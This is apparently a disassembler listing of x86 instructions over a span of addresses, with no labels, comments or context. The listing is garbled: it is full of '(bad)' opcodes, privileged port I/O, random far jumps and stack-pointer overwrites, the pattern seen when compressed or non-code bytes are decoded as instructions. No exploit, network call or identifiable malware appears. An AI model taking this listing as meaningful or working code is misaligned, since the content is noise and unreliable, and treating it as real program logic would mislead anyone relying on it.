  42c7a3:	inc    esp
  42c7a4:	bound  eax,QWORD PTR [edx]
  42c7a6:	cmc    
  42c7a7:	into   
  42c7a8:	and    DWORD PTR [ecx],ecx
  42c7aa:	lea    esp,[edi]
  42c7ac:	lods   al,BYTE PTR ds:[esi]
  42c7ad:	repnz fcmovbe st,st(5)
  42c7b0:	mov    esi,0xabd6f905
  42c7b5:	sbb    BYTE PTR [edx+0x609969ef],ch
  42c7bb:	loope  0x42c756
  42c7bd:	cmp    BYTE PTR [eax+0x34441ad1],bh
  42c7c3:	(bad)  
  42c7c4:	pop    eax
  42c7c5:	mov    edx,DWORD PTR [edx+esi*1]
  42c7c8:	xor    al,0xf8
  42c7ca:	inc    ebx
  42c7cb:	xchg   ebp,eax
  42c7cc:	mov    dl,0xf9
  42c7ce:	mov    esp,0x1fa0e23f
  42c7d3:	in     eax,dx
  42c7d4:	imul   eax,DWORD PTR [esi],0x36afb97
  42c7da:	retf   0x937d
  42c7dd:	test   DWORD PTR [edi+0x1f6e7299],ebp
  42c7e3:	sub    ecx,DWORD PTR [edx-0x3e]
  42c7e6:	pushf  
  42c7e7:	fmulp  st(4),st
  42c7e9:	in     eax,dx
  42c7ea:	and    dl,cl
  42c7ec:	sti    
  42c7ed:	in     al,dx
  42c7ee:	pop    ebp
  42c7ef:	sbb    al,0x39
  42c7f1:	mov    ebx,DWORD PTR [ebx]
  42c7f3:	pop    ss
  42c7f4:	inc    ecx
  42c7f5:	and    ah,BYTE PTR [ecx+0x2f]
  42c7f8:	pop    esp
  42c7f9:	sahf   
  42c7fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c7fb:	aaa    
  42c7fc:	popf   
  42c7fd:	sub    al,0xe7
  42c7ff:	mov    bh,BYTE PTR [ecx+0x3a]
  42c802:	jl     0x42c84c
  42c804:	in     eax,dx
  42c805:	pusha  
  42c806:	(bad)  
  42c807:	pop    edi
  42c808:	mov    BYTE PTR [ecx+0x62e1723c],dh
  42c80e:	push   0x44
  42c810:	data16 or al,0x7d
  42c813:	push   ebx
  42c814:	jg     0x42c801
  42c816:	stc    
  42c817:	clc    
  42c818:	in     eax,dx
  42c819:	add    ch,BYTE PTR ds:0xeb222648
  42c81f:	ror    BYTE PTR [ebx+0x7e],cl
  42c822:	ss pop ecx
  42c824:	cmp    BYTE PTR [edi+0x6f],dh
  42c827:	dec    edx
  42c828:	nop
  42c829:	mov    DWORD PTR [ebp+0x6f],0x25619010
  42c830:	jmp    0xd20f:0x1042bd13
  42c837:	mov    ebx,0xa5858913
  42c83c:	or     DWORD PTR [ebx-0x7056babe],ebp
  42c842:	pop    ds
  42c843:	mov    bl,0x1f
  42c845:	popf   
  42c846:	jecxz  0x42c7f6
  42c848:	outs   dx,BYTE PTR ds:[esi]
  42c849:	adc    al,0xbd
  42c84b:	aam    0x7
  42c84d:	mov    dh,BYTE PTR [ebp-0x6c]
  42c850:	adc    eax,0xb000264e
  42c855:	mov    ecx,DWORD PTR [ebp+0x15]
  42c858:	mov    BYTE PTR [edi-0x2c],dh
  42c85b:	xchg   edx,eax
  42c85c:	and    bh,BYTE PTR [ebx+0x38]
  42c85f:	xlat   BYTE PTR ds:[ebx]
  42c860:	xor    BYTE PTR [ecx-0x41],0x5f
  42c864:	ficomp WORD PTR ds:0xd7890154
  42c86a:	std    
  42c86b:	(bad)  
  42c86c:	aaa    
  42c86d:	pop    ss
  42c86e:	add    edi,DWORD PTR [esp+edx*4]
  42c871:	add    eax,0x1e26788a
  42c876:	mov    dl,0xf9
  42c878:	inc    ebp
  42c879:	fsubr  QWORD PTR [ebp-0x1]
  42c87c:	xor    BYTE PTR [edx-0xbd6aa3d],bh
  42c882:	mov    cs,WORD PTR [esi+0x535c1c18]
  42c888:	jl     0x42c832
  42c88a:	mov    al,ds:0x152579c6
  42c88f:	or     DWORD PTR [ecx-0x7481fa6f],0xaa93c7e6
  42c899:	push   edx
  42c89a:	inc    eax
  42c89b:	imul   ecx,DWORD PTR [ebx+0x3],0xffffffd2
  42c89f:	inc    esp
  42c8a0:	ins    DWORD PTR es:[edi],dx
  42c8a1:	xor    DWORD PTR [edi],ebx
  42c8a3:	xor    al,0x5d
  42c8a5:	test   eax,0x74e31f66
  42c8aa:	es adc eax,0x7302e23c
  42c8b0:	into   
  42c8b1:	add    bl,ah
  42c8b3:	and    dh,BYTE PTR [eax]
  42c8b5:	lahf   
  42c8b6:	fisttp DWORD PTR [eax-0x6aa9d363]
  42c8bc:	adc    DWORD PTR [ebx-0x5aa5aaa0],esi
  42c8c2:	into   
  42c8c3:	mov    dh,0xa9
  42c8c5:	add    eax,0x9b47f448
  42c8ca:	les    esp,FWORD PTR ds:0xd60b050
  42c8d0:	dec    DWORD PTR [ecx+0x12]
  42c8d3:	popa   
  42c8d4:	scas   al,BYTE PTR es:[edi]
  42c8d5:	scas   al,BYTE PTR es:[edi]
  42c8d6:	fcom   st(5)
  42c8d8:	mov    BYTE PTR [eax],bh
  42c8da:	xchg   DWORD PTR [ebp+0xb],esi
  42c8dd:	lods   al,BYTE PTR ds:[esi]
  42c8de:	jnp    0x42c935
  42c8e0:	mov    DWORD PTR ds:0xaed4d31,esi
  42c8e6:	pop    es
  42c8e7:	dec    ecx
  42c8e8:	stos   BYTE PTR es:[edi],al
  42c8e9:	add    ch,BYTE PTR [edi+ecx*4+0x59c3a159]
  42c8f0:	bound  esp,QWORD PTR [ebx+0x3f]
  42c8f3:	mov    ecx,0x6bf9d78a
  42c8f8:	inc    ebx
  42c8f9:	inc    DWORD PTR [edi-0x4d1a287b]
  42c8ff:	sub    BYTE PTR [eax-0x74d02193],cl
  42c905:	push   edi
  42c906:	mov    ch,ah
  42c908:	mov    edi,0x8d46f805
  42c90d:	into   
  42c90e:	pop    esi
  42c90f:	xchg   esi,eax
  42c910:	pushf  
  42c911:	rcl    BYTE PTR [ebx+ecx*2-0x436bfd71],1
  42c918:	mov    ah,0x77
  42c91a:	data16 add al,0x63
  42c91d:	mov    DWORD PTR [edi-0x10],edi
  42c920:	mov    esp,DWORD PTR [eax]
  42c922:	xchg   ebp,eax
  42c923:	xor    eax,0x9570dda4
  42c928:	push   eax
  42c929:	in     eax,dx
  42c92a:	pop    ds
  42c92b:	or     eax,0xab25c0e0
  42c930:	out    0xcf,al
  42c932:	not    edi
  42c934:	xchg   ecx,eax
  42c935:	das    
  42c936:	add    edi,ecx
  42c938:	fcomp  QWORD PTR [edx+0x70]
  42c93b:	out    0xe3,eax
  42c93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c93e:	adc    ah,dh
  42c940:	mov    DWORD PTR [ecx],eax
  42c942:	dec    esi
  42c943:	cdq    
  42c944:	jnp    0x42c995
  42c946:	enter  0x937f,0xa2
  42c94a:	xchg   DWORD PTR [esi-0x337f0961],ecx
  42c950:	fidiv  WORD PTR [esi]
  42c952:	hlt    
  42c953:	fimul  WORD PTR [ecx+0x3]
  42c956:	enter  0xc518,0x44
  42c95a:	fdivp  st(5),st
  42c95c:	outs   dx,BYTE PTR ds:[esi]
  42c95d:	sbb    BYTE PTR [ebx],bh
  42c95f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c960:	mov    BYTE PTR [ecx-0x33],bh
  42c963:	cmp    ch,BYTE PTR ds:0xc5ff4e20
  42c969:	mov    ch,0xd3
  42c96b:	xor    ecx,DWORD PTR [eax+0x3be68153]
  42c971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c972:	dec    ecx
  42c973:	sub    BYTE PTR [eax-0xc4d009b],cl
  42c979:	or     ecx,0x76024f07
  42c97f:	pop    edx
  42c980:	cli    
  42c981:	cmp    DWORD PTR [ecx],edx
  42c983:	mov    ecx,0xcb1f3459
  42c988:	call   0x9008:0x946d7629
  42c98f:	shr    DWORD PTR [ebx],1
  42c991:	scas   eax,DWORD PTR es:[edi]
  42c992:	push   ss
  42c993:	rcr    DWORD PTR [ebx+0x1f],1
  42c996:	sahf   
  42c997:	add    cl,BYTE PTR [ebp+0x79]
  42c99a:	pusha  
  42c99b:	jmp    0x36e726cf
  42c9a0:	cmp    eax,0xef2bde11
  42c9a5:	cmc    
  42c9a6:	fadd   DWORD PTR [ecx+esi*8-0x55]
  42c9aa:	pop    ebx
  42c9ab:	mov    ebx,0xf58d820f
  42c9b0:	push   esp
  42c9b1:	bound  eax,QWORD PTR [edx+0x72538bce]
  42c9b7:	or     al,0x2a
  42c9b9:	stos   BYTE PTR es:[edi],al
  42c9ba:	or     al,dh
  42c9bc:	add    BYTE PTR [edi],dl
  42c9be:	mov    dl,dh
  42c9c0:	pusha  
  42c9c1:	(bad)  
  42c9c3:	sub    eax,0xf71753e7
  42c9c8:	getsec 
  42c9ca:	xchg   edi,eax
  42c9cb:	stos   DWORD PTR es:[edi],eax
  42c9cc:	sub    al,BYTE PTR [edx]
  42c9ce:	mov    edi,0xdf7f2c38
  42c9d3:	pop    es
  42c9d4:	mov    esi,0xb4b5881f
  42c9d9:	inc    ecx
  42c9da:	and    BYTE PTR [ebx+0x59],dl
  42c9dd:	xor    eax,0x597ce82e
  42c9e2:	(bad)
  42c9e7:	call   0x3f68:0x706917c9
  42c9ee:	mul    DWORD PTR [ebx-0x12]
  42c9f1:	add    ebx,esi
  42c9f3:	mov    eax,0x57ea940c
  42c9f8:	push   0xffffffe3
  42c9fa:	call   0x5ff6535f
  42c9ff:	imul   ebp,DWORD PTR [eax],0x69a53990
  42ca05:	pop    ss
  42ca06:	mov    al,ds:0x66fc6566
  42ca0b:	cwde   
  42ca0c:	scas   eax,DWORD PTR es:[edi]
  42ca0d:	add    ecx,DWORD PTR [ecx-0x2b266bc0]
  42ca13:	adc    bh,BYTE PTR [edi+0x49]
  42ca16:	jmp    0xc22c889f
  42ca1b:	aad    0x79
  42ca1d:	mov    edi,0x7655a62
  42ca22:	cmp    ebp,ecx
  42ca24:	mov    DWORD PTR [ecx-0x6a],edx
  42ca27:	popf   
  42ca28:	aas    
  42ca29:	inc    edx
  42ca2a:	mov    dh,0xa9
  42ca2c:	sub    dh,dl
  42ca2e:	(bad)
  42ca31:	sub    BYTE PTR [eax],dl
  42ca33:	sub    BYTE PTR [edi-0x5a],dh
  42ca36:	xor    DWORD PTR [esi],ebx
  42ca38:	mov    DWORD PTR [ebx-0x19],edx
  42ca3b:	leave  
  42ca3c:	lahf   
  42ca3d:	inc    eax
  42ca3e:	mov    dl,0x9c
  42ca40:	mov    edx,0xc4c32600
  42ca45:	or     BYTE PTR [ecx+0x1c],ah
  42ca48:	mov    al,BYTE PTR [ebx+0x2a]
  42ca4b:	fbld   TBYTE PTR [esi+0x2a]
  42ca4e:	pop    ds
  42ca4f:	lods   eax,DWORD PTR ds:[esi]
  42ca50:	pop    ebp
  42ca51:	ss into 
  42ca53:	xor    ebx,esp
  42ca55:	cmp    eax,0x3d18d4bb
  42ca5a:	loope  0x42c9eb
  42ca5c:	dec    BYTE PTR [ecx]
  42ca5e:	cmp    dh,BYTE PTR [edx]
  42ca60:	mov    ch,dl
  42ca62:	dec    esi
  42ca63:	enter  0x54be,0xf7
  42ca67:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca69:	pop    ds
  42ca6a:	jb     0x42ca79
  42ca6c:	fwait
  42ca6d:	clc    
  42ca6e:	sahf   
  42ca6f:	stos   DWORD PTR es:[edi],eax
  42ca70:	jns    0x42caa1
  42ca72:	push   ebx
  42ca73:	jbe    0x42c9fe
  42ca75:	iret   
  42ca76:	xchg   ebx,eax
  42ca77:	dec    esi
  42ca78:	clc    
  42ca79:	(bad)  [ebx-0x21fcba38]
  42ca7f:	jecxz  0x42ca39
  42ca81:	lods   eax,DWORD PTR ds:[esi]
  42ca82:	mov    cl,0xf5
  42ca84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ca85:	int    0x60
  42ca87:	rcl    DWORD PTR [edi],0x48
  42ca8a:	push   ebx
  42ca8b:	inc    esi
  42ca8c:	sbb    al,BYTE PTR [eax]
  42ca8e:	jo     0x42ca64
  42ca90:	fwait
  42ca91:	pop    ebp
  42ca92:	ins    DWORD PTR es:[edi],dx
  42ca93:	and    BYTE PTR [edx-0x23],bl
  42ca96:	in     eax,dx
  42ca97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca98:	mov    BYTE PTR [ebp-0x7cdcc153],ah
  42ca9e:	mov    bh,0xe9
  42caa0:	aaa    
  42caa1:	add    bh,BYTE PTR [eax-0x11]
  42caa4:	ror    BYTE PTR [ebx+0x1a5de887],cl
  42caaa:	pop    ds
  42caab:	(bad)  
  42caad:	or     edi,eax
  42caaf:	pop    ecx
  42cab0:	outs   dx,BYTE PTR ds:[esi]
  42cab1:	xchg   esi,eax
  42cab2:	stos   DWORD PTR es:[edi],eax
  42cab3:	aad    0x83
  42cab5:	adc    cl,BYTE PTR [ebp+0x72a92825]
  42cabb:	jle    0x42ca46
  42cabd:	jge    0x42ca7a
  42cabf:	out    dx,al
  42cac0:	cdq    
  42cac1:	cmc    
  42cac2:	dec    esp
  42cac3:	and    DWORD PTR ds:0x86bc0185,ecx
  42cac9:	std    
  42caca:	fs test eax,0xbdb0034a
  42cad0:	clc    
  42cad1:	lea    edi,[ebp-0x21]
  42cad4:	sub    DWORD PTR [ebx+0x5f35d5dc],0xffffffb3
  42cadb:	sti    
  42cadc:	xchg   ebp,eax
  42cadd:	sbb    al,0x4e
  42cadf:	jmp    0xb29bdef5
  42cae4:	or     bl,bl
  42cae6:	sahf   
  42cae7:	clc    
  42cae8:	data16 mov dh,0x4f
  42caeb:	(bad)  
  42caec:	call   FWORD PTR [edi-0x2d]
  42caef:	aam    0x93
  42caf1:	rcl    BYTE PTR [edi+edi*2-0x2b13e8c2],0x27
  42caf9:	mov    edi,0x7ef68ecc
  42cafe:	repnz cwde 
  42cb00:	mov    BYTE PTR [edi],ah
  42cb02:	bound  ebp,QWORD PTR [ecx]
  42cb04:	mov    edi,0x5d73c53
  42cb09:	add    ah,BYTE PTR [eax]
  42cb0b:	mov    eax,0xe95f2885
  42cb10:	or     eax,ebp
  42cb12:	pop    ds
  42cb13:	icebp  
  42cb14:	add    DWORD PTR [ecx-0x1390b20],edx
  42cb1a:	cwde   
  42cb1b:	test   DWORD PTR [ebp-0x7bf3f448],ecx
  42cb21:	sub    al,BYTE PTR [edx]
  42cb23:	xchg   edi,eax
  42cb24:	mov    esp,ebx
  42cb26:	shl    DWORD PTR [eax+0x33],0xd5
  42cb2a:	mov    ss,ebp
  42cb2c:	cmp    BYTE PTR [ebp+0x3d3688ba],cl
  42cb32:	pushf  
  42cb33:	aam    0x8b
  42cb35:	mov    esi,0x10ec948
  42cb3a:	push   ds
  42cb3b:	dec    edi
  42cb3c:	mov    esp,0x26f98901
  42cb41:	fisttp DWORD PTR [edi-0x55]
  42cb44:	lea    edx,[ecx+0x65ce2afe]
  42cb4a:	mov    ebx,0x608fef51
  42cb4f:	jnp    0x42cb97
  42cb51:	add    al,0x15
  42cb53:	ret    0xc39e
  42cb56:	data16 aad 0x2d
  42cb59:	adc    eax,0xe6104556
  42cb5e:	fcmovnu st,st(1)
  42cb60:	mov    BYTE PTR [edi-0xe],cl
  42cb63:	add    BYTE PTR [ebp-0x37928438],ah
  42cb69:	add    bl,BYTE PTR [eax-0x10]
  42cb6c:	call   0xfbf75f46
  42cb71:	(bad)  
  42cb72:	pop    ds
  42cb73:	mov    esi,DWORD PTR [eax+0x38954e16]
  42cb79:	gs xchg esi,eax
  42cb7b:	aad    0xc7
  42cb7d:	fdivr  QWORD PTR [edx+0x6a]
  42cb80:	mov    ch,0x9f
  42cb82:	mov    ds:0x44abffcf,al
  42cb87:	stos   DWORD PTR es:[edi],eax
  42cb88:	cmp    al,0x42
  42cb8a:	icebp  
  42cb8b:	out    0xa8,eax
  42cb8d:	mov    si,0xed44
  42cb91:	mov    edi,esi
  42cb93:	xchg   BYTE PTR [eax-0x14816da5],al
  42cb99:	add    bl,dh
  42cb9b:	add    al,0x62
  42cb9d:	fwait
  42cb9e:	outs   dx,BYTE PTR ds:[esi]
  42cb9f:	mov    ah,0x88
  42cba1:	xchg   DWORD PTR [edi],ebp
  42cba3:	sub    eax,0x171b9457
  42cba8:	sub    al,0x3
  42cbaa:	dec    edx
  42cbab:	inc    edi
  42cbac:	fstp   TBYTE PTR [edx+0x6a81690f]
  42cbb2:	push   ds
  42cbb3:	cmp    DWORD PTR [edi+0x41d6e29],eax
  42cbb9:	jl     0x42cb9d
  42cbbb:	aam    0x12
  42cbbd:	mov    ah,dh
  42cbbf:	add    al,0xbd
  42cbc1:	dec    eax
  42cbc2:	lahf   
  42cbc3:	mov    WORD PTR [ecx+0x4c6ff7bb],es
  42cbc9:	in     eax,0x1f
  42cbcb:	mov    esp,fs
  42cbcd:	and    al,0x50
  42cbcf:	aam    0xe9
  42cbd1:	fcmovne st,st(3)
  42cbd3:	div    BYTE PTR gs:[eax-0x17]
  42cbd7:	or     eax,0x97e2ab86
  42cbdc:	inc    esi
  42cbdd:	inc    edx
  42cbde:	mov    edi,0x10edad2e
  42cbe3:	inc    ebx
  42cbe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cbe5:	sub    bl,BYTE PTR [edi]
  42cbe7:	out    dx,eax
  42cbe8:	loopne 0x42cba2
  42cbea:	jb     0x42cb79
  42cbec:	cmp    BYTE PTR [ebx+0x25371f8],dl
  42cbf2:	je     0x42cc13
  42cbf4:	xor    DWORD PTR [eax],esp
  42cbf6:	cmp    ch,al
  42cbf8:	(bad)  
  42cbf9:	cmp    al,0x88
  42cbfb:	in     al,dx
  42cbfc:	ret    0xfa05
  42cbff:	ror    BYTE PTR [ebx],1
  42cc01:	les    ebp,FWORD PTR [edi+ecx*2]
  42cc04:	mov    BYTE PTR [ecx],dh
  42cc06:	add    BYTE PTR [ebx-0x41d8d523],0xf
  42cc0d:	add    edx,DWORD PTR [esi]
  42cc0f:	jne    0x42cc3d
  42cc11:	or     BYTE PTR [edi+0x2a],ch
  42cc14:	aas    
  42cc15:	out    dx,al
  42cc16:	pop    ds
  42cc17:	cmc    
  42cc18:	daa    
  42cc19:	inc    esi
  42cc1a:	push   edx
  42cc1b:	mov    WORD PTR cs:[edx+0x3d],cs
  42cc1f:	aam    0x6d
  42cc21:	repnz xor bl,al
  42cc24:	aad    0x64
  42cc26:	push   ecx
  42cc27:	jmp    0x42cbb1
  42cc29:	adc    eax,0xea8b34a7
  42cc2e:	and    al,0xb7
  42cc30:	jmp    0x9c55a83a
  42cc35:	add    BYTE PTR [esi+0x1e6deea8],dh
  42cc3b:	dec    ebx
  42cc3c:	pusha  
  42cc3d:	(bad)  
  42cc3e:	pop    eax
  42cc3f:	mov    BYTE PTR [ebx+edx*1+0x2244d4ca],dh
  42cc46:	mov    dl,BYTE PTR [edx]
  42cc48:	mov    bl,0x5a
  42cc4a:	arpl   WORD PTR [edi+edx*4+0x55b159f5],sp
  42cc51:	inc    edx
  42cc52:	inc    eax
  42cc53:	push   edi
  42cc54:	in     al,dx
  42cc55:	ret    
  42cc56:	adc    ah,0x64
  42cc59:	jns    0x42cc0b
  42cc5b:	mov    esi,0xd6472b09
  42cc60:	imul   ebp,DWORD PTR [eax+0x61],0x29
  42cc64:	fnstsw WORD PTR ds:0x4f79c226
  42cc6a:	mov    esi,0x964647e1
  42cc6f:	mov    esp,DWORD PTR [ecx]
  42cc71:	adc    DWORD PTR [edi-0x47cd56d4],0xffffff96
  42cc78:	jge    0x42ccd7
  42cc7a:	pop    edx
  42cc7b:	mov    ds:0x2c9f2548,eax
  42cc80:	jecxz  0x42cc6f
  42cc82:	(bad)  
  42cc83:	mov    al,0x87
  42cc85:	add    eax,0xc49502be
  42cc8a:	cmp    al,0x5e
  42cc8c:	dec    ebp
  42cc8d:	sub    eax,0x58f3b36
  42cc92:	(bad)  [edi+esi*4-0x4f]
  42cc96:	cmp    esp,DWORD PTR [edi-0x67403ee6]
  42cc9c:	cmp    ebp,0xf182065
  42cca2:	xchg   edx,eax
  42cca3:	shl    BYTE PTR [ecx+0x34],cl
  42cca6:	mov    esp,0xc08b5e59
  42ccab:	dec    esi
  42ccac:	int3   
  42ccad:	jo     0x42cccd
  42ccaf:	pop    ds
  42ccb0:	jae    0x42ccfc
  42ccb2:	push   0xf8e70ae0
  42ccb7:	aad    0x3d
  42ccb9:	not    ch
  42ccbb:	mov    edi,0x21c4508a
  42ccc0:	pop    DWORD PTR [edi+0x6afa7c57]
  42ccc6:	rcl    DWORD PTR [edi+ebp*2],cl
  42ccc9:	sbb    al,0x6f
  42cccb:	inc    ecx
  42cccc:	cld    
  42cccd:	and    eax,0x422ee1f
  42ccd2:	or     ah,al
  42ccd4:	inc    esp
  42ccd5:	popf   
  42ccd6:	xchg   esi,eax
  42ccd7:	repz sub BYTE PTR [edx],al
  42ccda:	popa   
  42ccdb:	cmp    ebx,DWORD PTR [ebx-0x1a]
  42ccde:	das    
  42ccdf:	add    esp,esi
  42cce1:	in     al,dx
  42cce2:	mov    al,ds:0x1c05df41
  42cce7:	dec    esp
  42cce8:	sbb    BYTE PTR [ebp+eax*8+0x1fd6224d],al
  42ccef:	pop    es
  42ccf0:	jg     0x42ccfb
  42ccf2:	cmc    
  42ccf3:	test   BYTE PTR [eax+esi*1-0x6],dl
  42ccf7:	sar    ah,cl
  42ccf9:	ret    
  42ccfa:	arpl   si,sp
  42ccfc:	or     al,0x42
  42ccfe:	fiadd  WORD PTR [esi+0x2f]
  42cd01:	adc    eax,0xad8cb51e
  42cd06:	push   eax
  42cd07:	aas    
  42cd08:	sbb    al,0xa0
  42cd0a:	out    dx,al
  42cd0b:	aad    0xf8
  42cd0d:	adc    DWORD PTR [eax],ebx
  42cd0f:	sub    eax,0x51d040dd
  42cd14:	mov    DWORD PTR ds:0xccea3712,edi
  42cd1a:	sti    
  42cd1b:	call   0x3bf:0xad8d04b8
  42cd22:	dec    edx
  42cd23:	into   
  42cd24:	scas   eax,DWORD PTR es:[edi]
  42cd25:	add    dh,bl
  42cd27:	ror    BYTE PTR [edi+0x671608f],0xbf
  42cd2e:	push   ss
  42cd2f:	push   eax
  42cd30:	pop    esp
  42cd31:	push   0xeeecd5a1
  42cd36:	loopne 0x42cd09
  42cd38:	leave  
  42cd39:	imul   eax,edi,0xf2c18898
  42cd3f:	in     eax,0xc8
  42cd41:	and    al,0x6e
  42cd43:	mov    al,gs:0x50073805
  42cd49:	sub    BYTE PTR [eax],al
  42cd4b:	cs push es
  42cd4d:	push   cs
  42cd4e:	xchg   esp,eax
  42cd4f:	mov    ds:0xe66c2699,eax
  42cd54:	push   ss
  42cd55:	add    BYTE PTR [edx-0x25],ch
  42cd58:	jg     0x42cd0f
  42cd5a:	aaa    
  42cd5b:	mov    cl,0x55
  42cd5d:	cmp    al,0x6
  42cd5f:	jb     0x42cd4b
  42cd61:	add    al,BYTE PTR [edx+0x67]
  42cd64:	pop    edx
  42cd65:	shr    DWORD PTR ds:0x5d87b650,cl
  42cd6b:	xchg   ebx,eax
  42cd6c:	xor    DWORD PTR [esi-0x3f768f0f],0x36c805f
  42cd76:	dec    esp
  42cd77:	addr16 cdq 
  42cd79:	cmp    eax,DWORD PTR [esi]
  42cd7b:	into   
  42cd7c:	stos   BYTE PTR es:[edi],al
  42cd7d:	dec    esp
  42cd7e:	jp     0x42cd83
  42cd80:	scas   eax,DWORD PTR es:[edi]
  42cd81:	mov    cl,0xa7
  42cd83:	aam    0x45
  42cd85:	xor    ebx,DWORD PTR [edx]
  42cd87:	mov    esp,0xd73dff66
  42cd8c:	mov    esp,DWORD PTR [ebp+0x26165c2c]
  42cd92:	mov    BYTE PTR [edi-0x51f49a77],cl
  42cd98:	mov    bh,0x4d
  42cd9a:	xchg   edi,eax
  42cd9b:	mov    ah,0x5e
  42cd9d:	add    eax,DWORD PTR [esi+0xcd0808c]
  42cda3:	mov    ch,0xc8
  42cda5:	pop    ebp
  42cda6:	push   ds
  42cda7:	aaa    
  42cda8:	imul   esp,DWORD PTR [edx+0x2222fcb],0x11
  42cdaf:	xlat   BYTE PTR ds:[ebx]
  42cdb0:	xchg   BYTE PTR [eax],dh
  42cdb2:	hlt    
  42cdb3:	idiv   cl
  42cdb5:	pop    ss
  42cdb6:	loop   0x42cdfa
  42cdb8:	jge    0x42cdd3
  42cdba:	jl     0x42cde9
  42cdbc:	mov    edx,ebx
  42cdbe:	mov    edi,0x1a3ad3d7
  42cdc3:	push   ss
  42cdc4:	push   0xdfbda67c
  42cdc9:	or     ecx,DWORD PTR [ecx]
  42cdcb:	mov    ds:0x8f1e4909,al
  42cdd0:	fidivr DWORD PTR [ebx]
  42cdd2:	mov    WORD PTR [ebx],?
  42cdd4:	retf   
  42cdd5:	leave  
  42cdd6:	ins    BYTE PTR es:[edi],dx
  42cdd7:	cmp    eax,0x3b1fbe3f
  42cddc:	imul   eax,DWORD PTR [ebx],0x19
  42cddf:	and    DWORD PTR [edx+ecx*4+0x1f],ecx
  42cde3:	stos   DWORD PTR es:[edi],eax
  42cde4:	push   0x12
  42cde6:	int    0x44
  42cde8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cde9:	(bad)  
  42cdea:	adc    esp,edx
  42cdec:	add    ah,BYTE PTR [eax+0x5c59058d]
  42cdf2:	gs daa 
  42cdf4:	xchg   DWORD PTR [edi-0x2487a224],ebx
  42cdfa:	loopne 0x42cdfb
  42cdfc:	xchg   BYTE PTR [eax],bh
  42cdfe:	repnz lock inc ebx
  42ce01:	adc    eax,0x4488fcea
  42ce06:	out    dx,eax
  42ce07:	xor    eax,0xbdd15a4
  42ce0c:	xchg   BYTE PTR [ebx-0x47e26bb6],dh
  42ce12:	pop    edi
  42ce13:	mov    dl,0x10
  42ce15:	and    al,0x1a
  42ce17:	xlat   BYTE PTR ds:[ebx]
  42ce18:	int3   
  42ce19:	jl     0x42ce17
  42ce1b:	dec    esp
  42ce1c:	mov    cl,0x3c
  42ce1e:	fs dec edx
  42ce20:	xchg   BYTE PTR [ecx-0x1b],bh
  42ce23:	repz add esi,DWORD PTR [ecx+0x7f]
  42ce27:	pusha  
  42ce28:	mov    eax,0xdd4fba3
  42ce2d:	push   0x7efc984d
  42ce32:	jmp    0x53a7:0xe39579
  42ce39:	add    ah,bh
  42ce3b:	or     edx,DWORD PTR [eax]
  42ce3d:	and    BYTE PTR [edx],0xaa
  42ce40:	adc    edx,DWORD PTR [ebx-0x3a7f8da3]
  42ce46:	add    DWORD PTR [eax+ebx*4],edi
  42ce49:	and    DWORD PTR [esi+0x33],0x6fbce972
  42ce50:	dec    ebp
  42ce51:	ret    
  42ce52:	test   al,0x9f
  42ce54:	outs   dx,BYTE PTR ds:[esi]
  42ce55:	add    esi,DWORD PTR [eax+0x5b]
  42ce58:	mov    ebp,0x93d6381
  42ce5d:	aad    0x60
  42ce5f:	sbb    eax,0xb8e3ba4b
  42ce64:	scas   eax,DWORD PTR es:[edi]
  42ce65:	cmp    DWORD PTR [ebp+0x29f0126d],esi
  42ce6b:	aam    0x78
  42ce6d:	mov    ch,0x78
  42ce6f:	add    esp,ebx
  42ce71:	or     ebx,DWORD PTR [edi]
  42ce73:	in     eax,0x87
  42ce75:	inc    edi
  42ce76:	mov    ecx,0x8bb4e627
  42ce7b:	mov    al,0x7c
  42ce7d:	daa    
  42ce7e:	data16 ror dl,1
  42ce81:	lahf   
  42ce82:	jne    0x42ce7f
  42ce84:	or     BYTE PTR [ebx+0x56],bl
  42ce87:	pop    ebx
  42ce88:	jo     0x42ce9d
  42ce8a:	push   ds
  42ce8b:	push   edi
  42ce8c:	pop    es
  42ce8d:	leave  
  42ce8e:	inc    ebp
  42ce8f:	ins    BYTE PTR es:[edi],dx
  42ce90:	in     al,dx
  42ce91:	jmp    0xb683a0f7
  42ce96:	pop    ebp
  42ce97:	dec    ecx
  42ce98:	sub    DWORD PTR [esi-0x7622cb52],esi
  42ce9e:	add    DWORD PTR [esi],ebp
  42cea0:	pusha  
  42cea1:	ret    0x4d62
  42cea4:	outs   dx,DWORD PTR ds:[esi]
  42cea5:	dec    esi
  42cea6:	out    dx,al
  42cea7:	add    cl,BYTE PTR [esi]
  42cea9:	jge    0x42ceda
  42ceab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ceac:	sub    dh,dh
  42ceae:	dec    ebx
  42ceaf:	aam    0x37
  42ceb1:	adc    DWORD PTR [edx+0x51],0xbfb11cf
  42ceb8:	mov    BYTE PTR [edi],al
  42ceba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cebb:	outs   dx,DWORD PTR ds:[esi]
  42cebc:	sub    eax,0x7cf28e6
  42cec1:	add    eax,DWORD PTR [eax]
  42cec3:	les    edx,FWORD PTR [ebp+0x2851b15f]
  42cec9:	arpl   WORD PTR [edi],bx
  42cecb:	or     edx,esp
  42cecd:	mov    ds:0xc48283e,eax
  42ced2:	repz aam 0xe1
  42ced5:	jae    0x42cf02
  42ced7:	aas    
  42ced8:	je     0x42ceb3
  42ceda:	sub    BYTE PTR [edi],bl
  42cedc:	stc    
  42cedd:	arpl   WORD PTR [esp+ebx*2],bx
  42cee0:	pusha  
  42cee1:	add    ebp,DWORD PTR [ecx-0x3]
  42cee4:	and    DWORD PTR [ecx+edi*4],ebp
  42cee7:	pop    ss
  42cee8:	fwait
  42cee9:	add    dl,BYTE PTR [esi-0x71]
  42ceec:	jno    0x42cf3f
  42ceee:	loopne 0x42cec8
  42cef0:	sub    al,0xf6
  42cef2:	pop    ds
  42cef3:	inc    edi
  42cef4:	rcr    DWORD PTR [ecx-0x45],1
  42cef7:	cmp    eax,0x9ec98e08
  42cefc:	push   edi
